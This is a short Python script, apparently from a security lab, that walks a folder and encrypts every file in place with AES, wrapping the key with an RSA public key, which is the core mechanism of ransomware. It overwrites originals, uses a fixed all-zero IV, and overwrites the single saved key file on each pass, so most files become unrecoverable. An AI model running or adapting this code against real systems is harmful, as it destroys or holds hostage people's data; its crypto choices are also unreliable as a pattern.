import os
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes  # Add this line

def generate_aes_key():
    return os.urandom(32)  # 256-bit key

def encrypt_file(file_path, public_key):
    with open(file_path, 'rb') as f:
        data = f.read()

    aes_key = generate_aes_key()

    # Encrypt the AES key with the public key
    cipher_aes_key = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),  # Fix here
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # Save the encrypted AES key to a file
    with open('encrypted_aes_key.bin', 'wb') as key_file:
        key_file.write(cipher_aes_key)

    # Encrypt the file with the generated AES key
    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(b'\x00' * 16), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(data) + encryptor.finalize()

    # Save the encrypted data back to the file
    with open(file_path, 'wb') as f:
        f.write(encrypted_data)

def main():
    # Define the path to the folder to be encrypted
    folder_to_encrypt = "/home/sec-lab/Dummy"

    # Load the public key
    with open('public_key.pem', 'rb') as public_key_file:
        public_key = serialization.load_pem_public_key(
            public_key_file.read(),
            backend=default_backend()
        )

    # Encrypt each file in the folder
    for root, dirs, files in os.walk(folder_to_encrypt):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, public_key)

    print("Folder encrypted successfully.")

if __name__ == "__main__":
    main()
